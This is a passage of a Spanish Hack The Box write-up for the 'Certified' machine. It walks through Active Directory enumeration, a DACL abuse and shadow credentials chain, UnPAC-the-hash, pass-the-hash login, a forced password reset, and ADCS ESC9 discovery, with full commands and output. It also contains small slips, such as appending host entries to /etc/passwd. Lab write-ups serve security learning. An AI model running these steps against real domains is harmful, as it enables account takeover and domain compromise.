---
title: Certified
description: Certified es una máquina Windows de dificultad media diseñada para un supuesto escenario de vulneración, donde se proporcionan las credenciales de un usuario con pocos privilegios. Para acceder a la cuenta management_svc, se enumeran las ACL (Listas de Control de Acceso) de los objetos privilegiados, lo que nos lleva a descubrir que judith.mader, que tiene la ACL de propietario de escritura en el grupo de administración, tiene GenericWrite en la cuenta management_svc, donde finalmente podemos autenticarnos en el objetivo mediante WinRM, obteniendo el indicador de usuario. Se requiere la explotación del Servicio de Certificados de Active Directory (ADCS) para acceder a la cuenta de administrador mediante el uso indebido de credenciales shadow y ESC9.
date: 2025-02-11
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-certified/certified_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - windows
  - hack_the_box
  - tcp
  - dns
  - smb
  - kerberos
  - ldap
  - winrm
  - sid_enum
  - access_control_list
  - shadow_credentials_attack
  - tgt
  - unpac_the_hash
  - pass_the_hash
  - adcs_abuse
  - hash_dumping
  - information_gathering
  - active_directory_enumeration
  - active_directory_exploitation
  - privilege_escalation

---
### Machine Information

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: `judith.mader` Password: `judith09`

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/certified:-$ ping -c 1 10.10.11.41
PING 10.10.11.41 (10.10.11.41) 56(84) bytes of data.
64 bytes from 10.10.11.41: icmp_seq=1 ttl=127 time=359 ms

--- 10.10.11.41 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 359.377/359.377/359.377/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/certified:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.41 -n -Pn -oG nmap1
Host: 10.10.11.35 ()    Status: Up
Host: 10.10.11.35 ()    Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 5985/open/tcp//wsman///, 49669/open/tcp//msrpc///, 49673/open/tcp//ncacn_http///, 49674/open/tcp//msrpc///, 49713/open/tcp//msrpc///, 49737/open/tcp//msrpc///, 49770/open/tcp//msrpc///        Ignored State: filtered (65514)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/certified:-$ sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,5985,49669,49673,49674,49713,49737,49770 -vvv 10.10.11.41 -oN nmap2
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-12 04:33:45Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
| SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZa
| Fw0yNTA1MTMxNTQ5MzZaMB0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMx/FhgH36heOUjpNhO4JWYX
| E0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvgFLZ7yuZf3ubIcEv8
| wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmoX3i
| Ky0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l6
| 52hfOhdz5YOU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2E
| e+28xaBIGAgNn5TMcS+oJC0qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0C
| AwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4A
| dAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYD
| VR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4G
| CCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFl
| AwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYE
| FPTg6Uo2pYQv7jJTC9x7Reo9CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1L
| csBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2ggbqGgbdsZGFwOi8vL0NOPWNlcnRp
| ZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVk
| LERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xh
| c3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggr
| BgEFBQcwAoaBpWxkYXA6Ly8vQ049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
| ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG
| AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIw
| TgYJKwYBBAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0
| Njc3OC0yNjc1OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOC
| AQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDkyiu7uCaTOehQ4rITZE1xefpHW
| VVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJHsk+gby/JShv
| ztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuE
| aOEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQU
| fgVn+2b7pjWIPAWdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtI
| zQY41iYatWCKZW54Ylno2wj9tg==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-02-12T04:36:29+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-12T04:36:24+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
| SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZa
| Fw0yNTA1MTMxNTQ5MzZaMB0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMx/FhgH36heOUjpNhO4JWYX
| E0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvgFLZ7yuZf3ubIcEv8
| wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmoX3i
| Ky0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l6
| 52hfOhdz5YOU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2E
| e+28xaBIGAgNn5TMcS+oJC0qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0C
| AwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4A
| dAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYD
| VR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4G
| CCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFl
| AwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYE
| FPTg6Uo2pYQv7jJTC9x7Reo9CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1L
| csBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2ggbqGgbdsZGFwOi8vL0NOPWNlcnRp
| ZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVk
| LERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xh
| c3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggr
| BgEFBQcwAoaBpWxkYXA6Ly8vQ049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
| ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG
| AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIw
| TgYJKwYBBAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0
| Njc3OC0yNjc1OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOC
| AQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDkyiu7uCaTOehQ4rITZE1xefpHW
| VVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJHsk+gby/JShv
| ztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuE
| aOEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQU
| fgVn+2b7pjWIPAWdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtI
| zQY41iYatWCKZW54Ylno2wj9tg==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-12T04:36:29+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA/domainComponent=certified
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
| SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
| -----BEGIN CERTIFICATE-----
| MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlm
| aWVkMRowGAYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZa
| Fw0yNTA1MTMxNTQ5MzZaMB0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCC
| ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMx/FhgH36heOUjpNhO4JWYX
| E0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvgFLZ7yuZf3ubIcEv8
| wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmoX3i
| Ky0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l6
| 52hfOhdz5YOU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2E
| e+28xaBIGAgNn5TMcS+oJC0qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0C
| AwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4A
| dAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYD
| VR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4G
| CCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFl
| AwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYE
| FPTg6Uo2pYQv7jJTC9x7Reo9CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1L
| csBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2ggbqGgbdsZGFwOi8vL0NOPWNlcnRp
| ZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVk
| LERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xh
| c3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggr
| BgEFBQcwAoaBpWxkYXA6Ly8vQ049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENO
| PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3Vy
| YXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2Jq
| ZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG
| AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIw
| TgYJKwYBBAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0
| Njc3OC0yNjc1OTc4MDkxLTM4MjAzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOC
| AQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDkyiu7uCaTOehQ4rITZE1xefpHW
| VVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJHsk+gby/JShv
| ztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuE
| aOEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQU
| fgVn+2b7pjWIPAWdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtI
| zQY41iYatWCKZW54Ylno2wj9tg==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49713/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49737/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49770/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-12T04:35:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50458/tcp): CLEAN (Timeout)
|   Check 2 (port 26336/tcp): CLEAN (Timeout)
|   Check 3 (port 12583/udp): CLEAN (Timeout)
|   Check 4 (port 43140/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

El dominio identificado es `certified.htb`, y el Controlador de Dominio (DC) tiene el nombre `DC01.certified.htb`. Agrego estos nombres a `/etc/hosts`.

```terminal
/home/kali/Documents/htb/machines/certified:-$ echo '10.10.11.41\tcertified.htb\tdc01.certified.htb' | sudo tee -a /etc/passwd
```

---
## Active Directory Enumeration

Verificó las credenciales de `judith.mader` y confirmo al acceso al servidor SMB.

```terminal
/home/kali/Documents/htb/machines/certified:-$ netexec smb certified.htb -u "judith.mader" -p "judith09"
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
```

Uso crackmapexec para listar usuarios en el Active Directory.

```terminal
/home/kali/Documents/htb/machines/certified:-$ crackmapexec smb certified.htb -u "judith.mader" -p "judith09" --rid-brute | grep SidTypeUser
```

![](assets/img/htb-writeup-certified/certified1_1.png)

Ejecuto bloodhound para analizar permisos dentro del dominio.

```terminal
/home/kali/Documents/htb/machines/certified:-$ bloodhound-python -u judith.mader -p 'judith09' -c All -d certified.htb -ns 10.10.11.41
```

![](assets/img/htb-writeup-certified/certified1_2.png)
![](assets/img/htb-writeup-certified/certified1_3.png)

El análisis muestra que:

* `judith.mader` tiene el permiso `WriteOwner` ACL sobre el grupo `Management`.
* `Management` tiene `GenericWrite` ACL sobre el usuario `management_svc`.
* `management_svc` tiene `GenericAll` sobre `CA_Operator`.

Esto permite una escalada de privilegios encadenada a través de estos usuarios.

---
## Active Directory Exploitation

Modifico los permisos del grupo `Management` para otorgar el derecho `WriteMembers` a `judith.mader`.

```terminal
/home/kali/Documents/htb/machines/certified:-$ impacket-dacledit -action 'write' -rights 'WriteMembers' -target-dn "CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB" -principal "judith.mader" "certified.htb/judith.mader:judith09"
[*] DACL backed up to dacledit-20250211-202402.bak
[*] DACL modified successfully!
```

Ahora agrego a `judith.mader` al grupo `Management`. 

```terminal
/home/kali/Documents/htb/machines/certified:-$ bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
[+] judith.mader added to Management
```

Clono las herramientas necesarias para continuar.

```terminal
/home/kali//Documents/github/:-$ git clone https://github.com/ShutdownRepo/pywhisker.git
/home/kali//Documents/github/:-$ git clone https://github.com/dirkjanm/PKINITtools.git
```

Dado que `judith.mader` ahora forma parte del grupo `management`, y este grupo tiene el privilegio `GenericWrite`, ejecuto un [Shadow Credentials Attack](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.html) sobre `management_svc` agregando credenciales de autenticación para PKINIT en su atributo msDS-KeyCredentialLink. Esto permite obtener un TGT sin conocer la contraseña del usuario.

```terminal
(Entorno_Python)-/home/kali/Documents/htb/machines/certified:-$ python ~/Documents/github/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target management_svc --action add
```

![](assets/img/htb-writeup-certified/certified2_1.png)

Sincronizo la hora del sistema con el controlador de dominio para evitar errores de autenticación en Kerberos.

```terminal
/home/kali/Documents/htb/machines/certified:-$ sudo ntpdate certified.htb
```

Realizo una autenticación mediante PKINIT para obtener un TGT del usuario `management_svc`, utilizando un certificado `.pfx` y su contraseña previamente obtenida.

```terminal
(Entorno_Python)-/home/kali/Documents/htb/machines/certified:-$ sudo python ~/Documents/github/PKINITtools/gettgtpkinit.py -cert-pfx B9d864l1.pfx -pfx-pass 1wTrdCQNVWS01dVJTvPS certified.htb/management_svc hhh.ccache
```

![](assets/img/htb-writeup-certified/certified2_2.png)

Configuro el archivo de caché de credenciales. Y vuelvo a sincronizar el tiempo para evitar problemas.

```terminal
/home/kali/Documents/htb/machines/certified:-$ export KRB5CCNAME=hhh.ccache

/home/kali/Documents/htb/machines/certified:-$ sudo ntpdate certified.htb
```

Por ultimo, Realizo un [UnPAC the hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash) para solicitar el hash NTLM del usuario `management_svc`.

```terminal
(Entorno_Python)-/home/kali/Documents/htb/machines/certified:-$ sudo python ~/Documents/github/PKINITtools/getnthash.py -key 13009a39adb679e473a6adb24f5b8d89416a891de7e91db5a1a6940c6569e24b certified.htb/management_svc
```

![](assets/img/htb-writeup-certified/certified2_3.png)

De esta manera, logro autenticarme a través de Evil-WinRM y obtener acceso remoto al sistema.

```terminal
evil-winrm -i certified.htb -u management_svc -H "a091c1832bcdd4677c28b5a6a1295584"

*Evil-WinRM* PS C:\Users\management_svc> cat Desktop/user.txt
```

---
## Lateral Movement

Revisando nuevamente el BloodHound, compruebo que el usuario `management_svc` dispone de privilegios de `GenericAll` sobre el usuario `ca_operator`. Teniendo estos permisos, podo a llegar a cambiar las credenciales sobre el usuario `ca_operator`.


```terminal
/home/kali/Documents/htb/machines/certified:-$ pth-net rpc password "ca_operator" "12345678" -U "certified.htb"/"management_svc"%"a091c1832bcdd4677c28b5a6a1295584":"a091c1832bcdd4677c28b5a6a1295584"  -S "DC01.certified.htb"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH ...
```

Valido que se han modificado correctamente las credenciales del usuario en cuestión.

```terminal
/home/kali/Documents/htb/machines/certified:-$ nxc smb 10.10.11.41 -u ca_operator -p 12345678
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:12345678
```

---
## Privilege Escalation


Utilice Certipy para buscar y obtener información sobre la configuración de la Autoridad de Certificación (CA) `certified-DC01-CA` y los certificados asociados.

```terminal
/home/kali/Documents/htb/machines/certified:-$ certipy-ad find -u judith.mader@certified.htb -p judith09 -dc-ip 10.10.11.41
```

![](assets/img/htb-writeup-certified/certified3_1.png)

De este proceso, identificó una vulnerabilidad clasificada como [ESC9](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension). Esta vulnerabilidad en Active Directory Certificate Services (ADCS) que surge cuando los permisos de administración de la CA están mal configurados.

```terminal
/home/kali/Documents/htb/machines/certified:-$ head -95 20250211213634_Certipy.json
```
```json
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "certified-DC01-CA",
      "DNS Name": "DC01.certified.htb",
      "Certificate Subject": "CN=certified-DC01-CA, DC=certified, DC=htb",
      "Certificate Serial Number": "36472F2C180FBB9B4983AD4D60CD5A9D",
      "Certificate Validity Start": "2024-05-13 15:33:41+00:00",
      "Certificate Validity End": "2124-05-13 15:43:41+00:00",
      "Web Enrollment": "Disabled",
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Permissions": {
        "Owner": "CERTIFIED.HTB\\Administrators",
        "Access Rights": {
          "2": [
            "CERTIFIED.HTB\\Administrators",
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins"
          ],
          "1": [
            "CERTIFIED.HTB\\Administrators",
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins"
          ],
          "512": [
            "CERTIFIED.HTB\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "CertifiedAuthentication",
      "Display Name": "Certified Authentication",
      "Certificate Authorities": [
        "certified-DC01-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": false,
      "Certificate Name Flag": [
        "SubjectRequireDirectoryPath",
        "SubjectAltRequireUpn"
      ],
      "Enrollment Flag": [
        "NoSecurityExtension",
        "AutoEnrollment",
        "PublishToDs"
      ],
      "Private Key Flag": [
        "16842752"
      ],
      "Extended Key Usage": [
        "Server Authentication",
        "Client Authentication"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Validity Period": "1000 years",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "CERTIFIED.HTB\\operator ca",
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "CERTIFIED.HTB\\Administrator",
          "Write Owner Principals": [
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins",
            "CERTIFIED.HTB\\Administrator"
          ],
          "Write Dacl Principals": [
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins",
            "CERTIFIED.HTB\\Administrator"
          ],
          "Write Property Principals": [
            "CERTIFIED.HTB\\Domain Admins",
            "CERTIFIED.HTB\\Enterprise Admins",
            "CERTIFIED.HTB\\Administrator"
          ]
        }
      }
    },
```

La información obtenida por Certipy revela lo siguiente.

* La CA vulnerable es `certified-DC01-CA`, alojada en el servidor `DC01.certified.htb`.

```json
"CA Name": "certified-DC01-CA",
"DNS Name": "DC01.certified.htb",
"Certificate Subject": "CN=certified-DC01-CA, DC=certified, DC=htb",
```

* El template `CertifiedAuthentication` está habilitado.
* Tiene `Client Authentication`, lo que permite usar certificados para autenticación.
* La clave `Enrollment Flag` incluye `NoSecurityExtension`, lo que indica que el certificado no está restringido por controles de seguridad adicionales.

```json
"Template Name": "CertifiedAuthentication",
"Enabled": true,
"Client Authentication": true,
"Enrollment Flag": [
    "NoSecurityExtension",
    "AutoEnrollment",
    "PublishToDs"
],
```

* `operator ca` tiene permisos para inscribirse en este template.
* Esto permite obtener un certificado válido para autenticarse en el dominio.

```json
"Enrollment Rights": [
